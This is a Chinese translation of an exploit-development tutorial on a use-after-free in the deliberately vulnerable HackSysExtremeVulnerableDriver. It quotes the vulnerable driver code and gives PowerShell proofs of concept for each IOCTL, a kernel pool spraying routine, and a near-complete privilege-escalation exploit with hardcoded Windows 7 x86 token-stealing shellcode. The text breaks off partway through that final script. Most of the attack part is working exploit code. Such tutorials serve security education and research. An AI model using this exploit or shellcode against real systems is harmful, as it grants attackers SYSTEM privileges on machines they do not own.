---
title: Windows exploit系列教程第十五部分：内核利用程序之UAF
date: 2018-03-14 20:43:11
categories: exploit
tags:
	- windows
	- novice
---
fuzzySecurity于16年更新了数篇Windows内核exp的教程，本文是内核篇的第六篇。[点击查看原文](http://fuzzysecurity.com/tutorials/expDev/19.html)。

<!--more-->

# 内核利用程序之UAF

欢迎回到Windows exploit开发系列教程的第十五部分。今天我们来学习基于[@HackSysTeam's](https://twitter.com/HackSysTeam)驱动漏洞的另一种利用姿势。本文我们将写一个UAF（释放后重用）漏洞的exp，这也是首个较为复杂的漏洞课程。我建议读者耐心回顾一下下方列出的资料，它们提供了内核池内存以及保留对象相关知识的易于理解的说明。搭建环境的更多细节请参考本系列教程的第十部分。

+ HackSysExtremeVulnerableDriver ([@HackSysTeam](https://twitter.com/HackSysTeam)) - [here](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)
+ HackSysTeam-PSKernelPwn ([@FuzzySec](https://twitter.com/FuzzySec)) - [here](https://github.com/FuzzySecurity/HackSysTeam-PSKernelPwn)
+ Kernel Pool Exploitation on Windows 7 (Tarjei Mandt) - [here](http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf)
+ Reserve Objects in Windows 7 ([@j00ru](https://twitter.com/j00ru)) - [here](http://magazine.hitb.org/issues/HITB-Ezine-Issue-003.pdf)

## 侦查挑战

本文的侦查这部分有点不太一样，该UAF漏洞中有相当数量的驱动函数卷入进来。我们会逐一审视，最终酌情提供一些细节。

```cpp
NTSTATUS AllocateUaFObject() {
    NTSTATUS Status = STATUS_SUCCESS;
    PUSE_AFTER_FREE UseAfterFree = NULL;
 
    PAGED_CODE();
 
    __try {
        DbgPrint("[+] Allocating UaF Object\n");
 
        // Allocate Pool chunk
        UseAfterFree = (PUSE_AFTER_FREE)ExAllocatePoolWithTag(NonPagedPool,
                                                              sizeof(USE_AFTER_FREE),
                                                              (ULONG)POOL_TAG);
 
        if (!UseAfterFree) {
            // Unable to allocate Pool chunk
            DbgPrint("[-] Unable to allocate Pool chunk\n");
 
            Status = STATUS_NO_MEMORY;
            return Status;
        }
        else {
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPool));
            DbgPrint("[+] Pool Size: 0x%X\n", sizeof(USE_AFTER_FREE));
            DbgPrint("[+] Pool Chunk: 0x%p\n", UseAfterFree);
        }
 
        // Fill the buffer with ASCII 'A'
        RtlFillMemory((PVOID)UseAfterFree->Buffer, sizeof(UseAfterFree->Buffer), 0x41);
 
        // Null terminate the char buffer
        UseAfterFree->Buffer[sizeof(UseAfterFree->Buffer) - 1] = '\0';
 
        // Set the object Callback function
        UseAfterFree->Callback = &UaFObjectCallback;
 
        // Assign the address of UseAfterFree to a global variable
        g_UseAfterFreeObject = UseAfterFree;
 
        DbgPrint("[+] UseAfterFree Object: 0x%p\n", UseAfterFree);
        DbgPrint("[+] g_UseAfterFreeObject: 0x%p\n", g_UseAfterFreeObject);
        DbgPrint("[+] UseAfterFree->Callback: 0x%p\n", UseAfterFree->Callback);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }
 
    return Status;
}
```

函数分配了非分页内存池块，并用'A'字符填充，指派了一个回调函数指针并添加了一个null结束符。IDA中基本一致，下面的截图可以用来参考。注意对象尺寸是0x58字节，池标签为"Hack"(小端)。

![](/images/exploit/fuzzySecurity/20180314_1.jpg)

我们可以用下面的PowerShell POC来调用这个函数。

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
   
public static class EVD
{
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateFile(
        String lpFileName,
        UInt32 dwDesiredAccess,
        UInt32 dwShareMode,
        IntPtr lpSecurityAttributes,
        UInt32 dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile);
   
    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice,
        int IoControlCode,
        byte[] InBuffer,
        int nInBufferSize,
        byte[] OutBuffer,
        int nOutBufferSize,
        ref int pBytesReturned,
        IntPtr Overlapped);
   
    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();
}
"@
   
$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
   
if ($hDevice -eq -1) {
    echo "`n[!] Unable to get driver handle..`n"
    Return
} else {
    echo "`n[>] Driver information.."
    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
    echo "[+] Handle: $hDevice"
}
  
# 0x222013 - HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT
[EVD]::DeviceIoControl($hDevice, 0x222013, $No_Buffer, $No_Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
```

![](/images/exploit/fuzzySecurity/20180314_2.jpg)

```cpp
NTSTATUS FreeUaFObject() {
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
 
    PAGED_CODE();
 
    __try {
        if (g_UseAfterFreeObject) {
            DbgPrint("[+] Freeing UaF Object\n");
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Chunk: 0x%p\n", g_UseAfterFreeObject);
 
#ifdef SECURE
            // Secure Note: This is secure because the developer is setting
            // 'g_UseAfterFreeObject' to NULL once the Pool chunk is being freed
            ExFreePoolWithTag((PVOID)g_UseAfterFreeObject, (ULONG)POOL_TAG);
 
            g_UseAfterFreeObject = NULL;
#else
            // Vulnerability Note: This is a vanilla Use After Free vulnerability
            // because the developer is not setting 'g_UseAfterFreeObject' to NULL.
            // Hence, g_UseAfterFreeObject still holds the reference to stale pointer
            // (dangling pointer)
            ExFreePoolWithTag((PVOID)g_UseAfterFreeObject, (ULONG)POOL_TAG);
#endif
 
            Status = STATUS_SUCCESS;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }
 
    return Status;
}
```

对等考虑，上面的函数对引用标签值的内存池块进行了释放。这个函数包含了UAF漏洞的关键点——在对象被释放后，"g_UseAfterFreeObject"没有置空。这就留下了一个野指针。我们再次试试下面的POC。

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
   
public static class EVD
{
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateFile(
        String lpFileName,
        UInt32 dwDesiredAccess,
        UInt32 dwShareMode,
        IntPtr lpSecurityAttributes,
        UInt32 dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile);
   
    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice,
        int IoControlCode,
        byte[] InBuffer,
        int nInBufferSize,
        byte[] OutBuffer,
        int nOutBufferSize,
        ref int pBytesReturned,
        IntPtr Overlapped);
   
    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();
}
"@
   
$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
   
if ($hDevice -eq -1) {
    echo "`n[!] Unable to get driver handle..`n"
    Return
} else {
    echo "`n[>] Driver information.."
    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
    echo "[+] Handle: $hDevice"
}
  
# 0x22201B - HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT
[EVD]::DeviceIoControl($hDevice, 0x22201B, $No_Buffer, $No_Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
```

![](/images/exploit/fuzzySecurity/20180314_3.jpg)

注意到该内存块地址和前面分配的是同一个。

```cpp
NTSTATUS UseUaFObject() {
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
 
    PAGED_CODE();
 
    __try {
        if (g_UseAfterFreeObject) {
            DbgPrint("[+] Using UaF Object\n");
            DbgPrint("[+] g_UseAfterFreeObject: 0x%p\n", g_UseAfterFreeObject);
            DbgPrint("[+] g_UseAfterFreeObject->Callback: 0x%p\n", g_UseAfterFreeObject->Callback);
            DbgPrint("[+] Calling Callback\n");
 
            if (g_UseAfterFreeObject->Callback) {
                g_UseAfterFreeObject->Callback();
            }
 
            Status = STATUS_SUCCESS;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }
 
    return Status;
}
```

该函数从"g_UseAfterFreeObject"读取值并执行该对象的回调函数。如果我们通过下面的POC调用该函数，那么最终以调用到一个不稳定的内存地址而告终，这是因为系统可以自由的把前面释放掉的内存块用于其他目的，只要它合适。

```cpp
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
   
public static class EVD
{
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateFile(
        String lpFileName,
        UInt32 dwDesiredAccess,
        UInt32 dwShareMode,
        IntPtr lpSecurityAttributes,
        UInt32 dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile);
   
    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice,
        int IoControlCode,
        byte[] InBuffer,
        int nInBufferSize,
        byte[] OutBuffer,
        int nOutBufferSize,
        ref int pBytesReturned,
        IntPtr Overlapped);
   
    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();
}
"@
   
$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
   
if ($hDevice -eq -1) {
    echo "`n[!] Unable to get driver handle..`n"
    Return
} else {
    echo "`n[>] Driver information.."
    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
    echo "[+] Handle: $hDevice"
}
  
# 0x222017 - HACKSYS_EVD_IOCTL_USE_UAF_OBJECT
[EVD]::DeviceIoControl($hDevice, 0x222017, $No_Buffer, $No_Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
```

最终，经过一些谋划，我们找到这样一个驱动函数：它允许我们在非分页内存池上分配一个伪造的对象；更为方便的，该函数允许我们把对象分配到原本的UAF对象所在的位置上。

```cpp
NTSTATUS AllocateFakeObject(IN PFAKE_OBJECT UserFakeObject) {
    NTSTATUS Status = STATUS_SUCCESS;
    PFAKE_OBJECT KernelFakeObject = NULL;
 
    PAGED_CODE();
 
    __try {
        DbgPrint("[+] Creating Fake Object\n");
 
        // Allocate Pool chunk
        KernelFakeObject = (PFAKE_OBJECT)ExAllocatePoolWithTag(NonPagedPool,
                                                               sizeof(FAKE_OBJECT),
                                                               (ULONG)POOL_TAG);
 
        if (!KernelFakeObject) {
            // Unable to allocate Pool chunk
            DbgPrint("[-] Unable to allocate Pool chunk\n");
 
            Status = STATUS_NO_MEMORY;
            return Status;
        }
        else {
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPool));
            DbgPrint("[+] Pool Size: 0x%X\n", sizeof(FAKE_OBJECT));
            DbgPrint("[+] Pool Chunk: 0x%p\n", KernelFakeObject);
        }
 
        // Verify if the buffer resides in user mode
        ProbeForRead((PVOID)UserFakeObject, sizeof(FAKE_OBJECT), (ULONG)__alignof(FAKE_OBJECT));
 
        // Copy the Fake structure to Pool chunk
        RtlCopyMemory((PVOID)KernelFakeObject, (PVOID)UserFakeObject, sizeof(FAKE_OBJECT));
 
        // Null terminate the char buffer
        KernelFakeObject->Buffer[sizeof(KernelFakeObject->Buffer) - 1] = '\0';
 
        DbgPrint("[+] Fake Object: 0x%p\n", KernelFakeObject);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }
 
    return Status;
}
```

调用该函数的POC在下方。注意，这里我们需要精心制作一个缓冲区并提供一个输入长度。

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
   
public static class EVD
{
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateFile(
        String lpFileName,
        UInt32 dwDesiredAccess,
        UInt32 dwShareMode,
        IntPtr lpSecurityAttributes,
        UInt32 dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile);
   
    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice,
        int IoControlCode,
        byte[] InBuffer,
        int nInBufferSize,
        byte[] OutBuffer,
        int nOutBufferSize,
        ref int pBytesReturned,
        IntPtr Overlapped);
   
    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();
}
"@
   
$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
   
if ($hDevice -eq -1) {
    echo "`n[!] Unable to get driver handle..`n"
    Return
} else {
    echo "`n[>] Driver information.."
    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
    echo "[+] Handle: $hDevice"
}
  
# 0x22201F - HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT
$Buffer = [Byte[]](0x41)*0x4 + [Byte[]](0x42)*0x5B + 0x00 # len 0x60
[EVD]::DeviceIoControl($hDevice, 0x22201F, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
```

![](/images/exploit/fuzzySecurity/20180314_4.jpg)

## Pwn

很好，基本原理上面已经说明。

1. 我们分配一个UAF对象。
2. 我们释放掉UAF对象。
3. 我们使用伪造的对象占坑释放掉的UAF对象内存。
4. 我们用野指针调用UAF对象的callback函数，此时callback函数指针已经由伪造的对象来决定了。

非常好，也非常简单！

唯一的麻烦在于我们可能遇到内存对齐以及内存池块合并的问题，这里我再次推荐你阅读Tarjei的[paper](http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf)。本质上来说，如果我们释放掉的UAF对象与其他空闲的内存池块毗邻的话，出于性能的考虑，内存分配器会合并这些块。一旦发生这种情况，我们很可能就无法用伪造的对象来占坑了。为了避免这种情况，我们需要对非分页内存池的状态有一个全盘的预测，强制驱动在UAF对象的位置分配内存给我们，以便于后面的覆盖！

我们的第一个目标在于填充，尽可能的把所有非分页内存池“起始”的空闲空间填满。为此我们需要创建一大堆与UAF对象尺寸相近的对象。IoCompletionReverse对象是一个完美的候选者，它在非分页内存池上分配且尺寸为0x60！

首先，在喷射（Spray）内存池之前，让我们先看看IoCompletionReserve的对象类型（对象类型可以通过"!object \ObjectTypes"来查看）。

![](/images/exploit/fuzzySecurity/20180314_5.jpg)

我们可以使用NtAllocateReserveObject函数来创建IoCo对象。该函数返回一个创建对象的句柄，只要我们不释放该句柄，这个对象将永远在内存池中保留分配态。在下面的POC中我喷射了这些对象到两个位置：

1. 10000个对象用于填充碎片化内存池空间。
2. 5000个对象如期的连在一起。

出于调试的目的，该脚本转储了最后的10个句柄到标准输出并且会在WinDBG中自动设置一个断点。

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
   
public static class EVD
{
 
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern Byte CloseHandle(
        IntPtr hObject);
 
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtAllocateReserveObject(
        ref IntPtr hObject,
        UInt32  ObjectAttributes,
        UInt32 ObjectType);
         
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern void DebugBreak();
}
"@
 
function IoCo-PoolSpray {
    echo "[+] Derandomizing NonPagedPool.."
    $Spray = @()
    for ($i=0;$i -lt 10000;$i++) {
        $hObject = [IntPtr]::Zero
        $CallResult = [EVD]::NtAllocateReserveObject([ref]$hObject, 0, 1)
        if ($CallResult -eq 0) {
            $Spray += $hObject
        }
    }
    $Script:IoCo_hArray1 += $Spray
    echo "[+] $($IoCo_hArray1.Length) IoCo objects created!"
 
    echo "[+] Allocating sequential objects.."
    $Spray = @()
    for ($i=0;$i -lt 5000;$i++) {
        $hObject = [IntPtr]::Zero
        $CallResult = [EVD]::NtAllocateReserveObject([ref]$hObject, 0, 1)
        if ($CallResult -eq 0) {
            $Spray += $hObject
        }
    }
    $Script:IoCo_hArray2 += $Spray
    echo "[+] $($IoCo_hArray2.Length) IoCo objects created!"
}
 
echo "`n[>] Spraying non-paged kernel pool!"
IoCo-PoolSpray
 
echo "`n[>] Last 10 object handles:"
for ($i=1;$i -lt 11; $i++) {
    "{0:X}" -f $($($IoCo_hArray2[-$i]).ToInt64())
}
 
echo "`n[>] Triggering WinDBG breakpoint.."
[EVD]::DebugBreak()
```

你可以看到这些输出，并在WinDBG上命中断点。

![](/images/exploit/fuzzySecurity/20180314_6.jpg)

如果我们再看看IoCompletionReserve类型，就可以发现实际上分配了15000个对象！

![](/images/exploit/fuzzySecurity/20180314_7.jpg)

让我们观察一个标准输出中转储的句柄。

![](/images/exploit/fuzzySecurity/20180314_8.jpg)

如期所致，这是个IoCompletionReserve对象。同时，考虑到这是我们喷射的最后一批句柄，它们应该在非分页内存池上被连续的分配。

![](/images/exploit/fuzzySecurity/20180314_9.jpg)

很好，我们看到对象的尺寸是0x60(96)个字节，它们稳定的在内存池中连续分配！最后一步我们会在POC中添加一个例程，用于释放第二次喷射中偶数次分配的IoCompletionReserve对象（一共2500个）来在非分页内存池上挖坑。

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
   
public static class EVD
{
 
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern Byte CloseHandle(
        IntPtr hObject);
 
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtAllocateReserveObject(
        ref IntPtr hObject,
        UInt32  ObjectAttributes,
        UInt32 ObjectType);
         
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern void DebugBreak();
}
"@
 
function IoCo-PoolSpray {
    echo "[+] Derandomizing NonPagedPool.."
    $Spray = @()
    for ($i=0;$i -lt 10000;$i++) {
        $hObject = [IntPtr]::Zero
        $CallResult = [EVD]::NtAllocateReserveObject([ref]$hObject, 0, 1)
        if ($CallResult -eq 0) {
            $Spray += $hObject
        }
    }
    $Script:IoCo_hArray1 += $Spray
    echo "[+] $($IoCo_hArray1.Length) IoCo objects created!"
 
    echo "[+] Allocating sequential objects.."
    $Spray = @()
    for ($i=0;$i -lt 5000;$i++) {
        $hObject = [IntPtr]::Zero
        $CallResult = [EVD]::NtAllocateReserveObject([ref]$hObject, 0, 1)
        if ($CallResult -eq 0) {
            $Spray += $hObject
        }
    }
    $Script:IoCo_hArray2 += $Spray
    echo "[+] $($IoCo_hArray2.Length) IoCo objects created!"
 
    echo "[+] Creating non-paged pool holes.."
    for ($i=0;$i -lt $($IoCo_hArray2.Length);$i+=2) {
        $CallResult = [EVD]::CloseHandle($IoCo_hArray2[$i])
        if ($CallResult -ne 0) {
            $FreeCount += 1
        }
    }
    echo "[+] Free'd $FreeCount IoCo objects!"
}
 
echo "`n[>] Spraying non-paged kernel pool!"
IoCo-PoolSpray
 
echo "`n[>] Last 10 object handles:"
for ($i=1;$i -lt 11; $i++) {
    "{0:X}" -f $($($IoCo_hArray2[-$i]).ToInt64())
}
 
echo "`n[>] Triggering WinDBG breakpoint.."
[EVD]::DebugBreak()
```

![](/images/exploit/fuzzySecurity/20180314_10.jpg)

这2500个0x60字节大小的空闲内存池块现在就处于一个可预测的位置，它们中的每一个都被两个已分配块所包围，阻止了他们的合并操作！

是时候把所有的过程整合在一起了。

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
   
public static class EVD
{
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateFile(
        String lpFileName,
        UInt32 dwDesiredAccess,
        UInt32 dwShareMode,
        IntPtr lpSecurityAttributes,
        UInt32 dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile);
   
    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice,
        int IoControlCode,
        byte[] InBuffer,
        int nInBufferSize,
        byte[] OutBuffer,
        int nOutBufferSize,
        ref int pBytesReturned,
        IntPtr Overlapped);
 
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern Byte CloseHandle(
        IntPtr hObject);
 
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtAllocateReserveObject(
        ref IntPtr hObject,
        UInt32  ObjectAttributes,
        UInt32 ObjectType);
   
    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();
}
"@
 
function IoCo-PoolSpray {
    echo "[+] Derandomizing NonPagedPool.."
    $Spray = @()
    for ($i=0;$i -lt 10000;$i++) {
        $hObject = [IntPtr]::Zero
        $CallResult = [EVD]::NtAllocateReserveObject([ref]$hObject, 0, 1)
        if ($CallResult -eq 0) {
            $Spray += $hObject
        }
    }
    $Script:IoCo_hArray1 += $Spray
    echo "[+] $($IoCo_hArray1.Length) IoCo objects created!"
 
    echo "[+] Allocating sequential objects.."
    $Spray = @()
    for ($i=0;$i -lt 5000;$i++) {
        $hObject = [IntPtr]::Zero
        $CallResult = [EVD]::NtAllocateReserveObject([ref]$hObject, 0, 1)
        if ($CallResult -eq 0) {
            $Spray += $hObject
        }
    }
    $Script:IoCo_hArray2 += $Spray
    echo "[+] $($IoCo_hArray2.Length) IoCo objects created!"
 
    echo "[+] Creating non-paged pool holes.."
    for ($i=0;$i -lt $($IoCo_hArray2.Length);$i+=2) {
        $CallResult = [EVD]::CloseHandle($IoCo_hArray2[$i])
        if ($CallResult -ne 0) {
            $FreeCount += 1
        }
    }
    echo "[+] Free'd $FreeCount IoCo objects!"
}
   
$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
   
if ($hDevice -eq -1) {
    echo "`n[!] Unable to get driver handle..`n"
    Return
} else {
    echo "`n[>] Driver information.."
    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
    echo "[+] Handle: $hDevice"
}
 
echo "`n[>] Spraying non-paged kernel pool!"
IoCo-PoolSpray
 
echo "`n[>] Staging vulnerability.."
# Allocate UAF Object
#---
# 0x222013 - HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT
echo "[+] Allocating UAF object"
[EVD]::DeviceIoControl($hDevice, 0x222013, $No_Buffer, $No_Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
 
# Free UAF Object
#---
# 0x22201B - HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT
echo "[+] Freeing UAF object"
[EVD]::DeviceIoControl($hDevice, 0x22201B, $No_Buffer, $No_Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
 
# Fake Object allocation
#---
# 0x22201F - HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT
echo "[+] Spraying 5000 fake objects"
$Buffer = [Byte[]](0x41)*0x4 + [Byte[]](0x42)*0x5B + 0x00 # len = 0x60
for ($i=0;$i -lt 5000;$i++){
    [EVD]::DeviceIoControl($hDevice, 0x22201F, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
}
 
# Trigger stale callback
#---
# 0x222017 - HACKSYS_EVD_IOCTL_USE_UAF_OBJECT
echo "`n[>] Triggering UAF vulnerability!`n"
[EVD]::DeviceIoControl($hDevice, 0x222017, $No_Buffer, $No_Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
```

在UseUaFObject函数上下个断点，这里有回调函数的调用并执行到我们最终的POC。

## 游戏结束

真是好大一盘棋。为了武装我们的POC，我们需要替换回调函数指针成我们的shellcode地址。更多细节请参考下方完整的exp。

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
   
public static class EVD
{
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateFile(
        String lpFileName,
        UInt32 dwDesiredAccess,
        UInt32 dwShareMode,
        IntPtr lpSecurityAttributes,
        UInt32 dwCreationDisposition,
        UInt32 dwFlagsAndAttributes,
        IntPtr hTemplateFile);
   
    [DllImport("Kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(
        IntPtr hDevice,
        int IoControlCode,
        byte[] InBuffer,
        int nInBufferSize,
        byte[] OutBuffer,
        int nOutBufferSize,
        ref int pBytesReturned,
        IntPtr Overlapped);
 
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern Byte CloseHandle(
        IntPtr hObject);
 
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        UInt32 flAllocationType,
        UInt32 flProtect);
 
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtAllocateReserveObject(
        ref IntPtr hObject,
        UInt32  ObjectAttributes,
        UInt32 ObjectType);
}
"@
 
function IoCo-PoolSpray {
    echo "[+] Derandomizing NonPagedPool.."
    $Spray = @()
    for ($i=0;$i -lt 10000;$i++) {
        $hObject = [IntPtr]::Zero
        $CallResult = [EVD]::NtAllocateReserveObject([ref]$hObject, 0, 1)
        if ($CallResult -eq 0) {
            $Spray += $hObject
        }
    }
    $Script:IoCo_hArray1 += $Spray
    echo "[+] $($IoCo_hArray1.Length) IoCo objects created!"
 
    echo "[+] Allocating sequential objects.."
    $Spray = @()
    for ($i=0;$i -lt 5000;$i++) {
        $hObject = [IntPtr]::Zero
        $CallResult = [EVD]::NtAllocateReserveObject([ref]$hObject, 0, 1)
        if ($CallResult -eq 0) {
            $Spray += $hObject
        }
    }
    $Script:IoCo_hArray2 += $Spray
    echo "[+] $($IoCo_hArray2.Length) IoCo objects created!"
 
    echo "[+] Creating non-paged pool holes.."
    for ($i=0;$i -lt $($IoCo_hArray2.Length);$i+=2) {
        $CallResult = [EVD]::CloseHandle($IoCo_hArray2[$i])
        if ($CallResult -ne 0) {
            $FreeCount += 1
        }
    }
    echo "[+] Free'd $FreeCount IoCo objects!"
}
 
# Compiled with Keystone-Engine
# Hardcoded offsets for Win7 x86 SP1
$Shellcode = [Byte[]] @(
    #---[Setup]
    0x60,                               # pushad
    0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, # mov eax, fs:[KTHREAD_OFFSET]
    0x8B, 0x40, 0x50,                   # mov eax, [eax + EPROCESS_OFFSET]
    0x89, 0xC1,                         # mov ecx, eax (Current _EPROCESS structure)
    0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00, # mov ebx, [eax + TOKEN_OFFSET]
    #---[Copy System PID token]
    0xBA, 0x04, 0x00, 0x00, 0x00,       # mov edx, 4 (SYSTEM PID)
    0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, # mov eax, [eax + FLINK_OFFSET] <-|
    0x2D, 0xB8, 0x00, 0x00, 0x00,       # sub eax, FLINK_OFFSET           |
    0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, # cmp [eax + PID_OFFSET], edx     |
    0x75, 0xED,                         # jnz                           ->|
    0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, # mov edx, [eax + TOKEN_OFFSET]
    0x89, 0x91, 0xF8, 0x00, 0x00, 0x00, # mov [ecx + TOKEN_OFFSET], edx
    #---[Recover]
    0x61,                               # popad
    0xC3                                # ret
)
  
# Write shellcode to memory
echo "`n[>] Allocating ring0 payload.."
[IntPtr]$Pointer = [EVD]::VirtualAlloc([System.IntPtr]::Zero, $Shellcode.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $Pointer, $Shellcode.Length)
$ShellcodePointer = [System.BitConverter]::GetBytes($Pointer.ToInt32())
echo "[+] Payload size: $($Shellcode.Length)"
echo "[+] Payload address: 0x$("{0:X8}" -f $Pointer.ToInt32())"
   
$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
   
if ($hDevice -eq -1) {
    echo "`n[!] Unable to get driver handle..`n"
    Return
} else {
    echo "`n[>] Driver information.."
    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
    echo "[+] Handle: $hDevice"
}
 
echo "`n[>] Spraying non-paged kernel pool!"
IoCo-PoolSpray
 
echo "`n[>] Staging vulnerability.."
# Allocate UAF Object
#---
# 0x222013 - HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT
echo "[+] Allocating UAF object"
